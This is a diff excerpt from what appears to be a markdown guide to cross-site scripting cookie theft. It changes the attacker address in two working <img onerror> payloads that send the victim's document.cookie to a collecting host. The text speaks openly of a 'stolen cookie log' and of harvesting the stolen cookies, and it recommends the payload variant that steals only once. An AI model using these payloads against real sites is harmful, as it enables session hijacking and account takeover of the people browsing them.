@@ -51,13 +51,13 @@ This one is the same but no `alert()` and all on one line.
 ### 3. `<img>` Tag Instead of `<script>` Tags
 Don't use this one! It works but calls `onerror()` in a loop, filling up your stolen cookie log:
 ```html
-<img src=x onerror=this.src='http://192.168.0.18:8888/?'+document.cookie;>
+<img src=x onerror=this.src='http://10.12.66.225/?'+document.cookie;>
 ```
 
 ### 4. `<img>` Tag and Without the Infinite Loop
 This one works and will only steal the cookie once. I adapted it from a posting on the old [kirupa.com][4] forum.
 ```html
-<img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">
+<img src=x onerror="this.src='http://10.12.66.225/?'+document.cookie; this.removeAttribute('onerror');">
 ```
 
 ## Harvest the Stolen Cookies
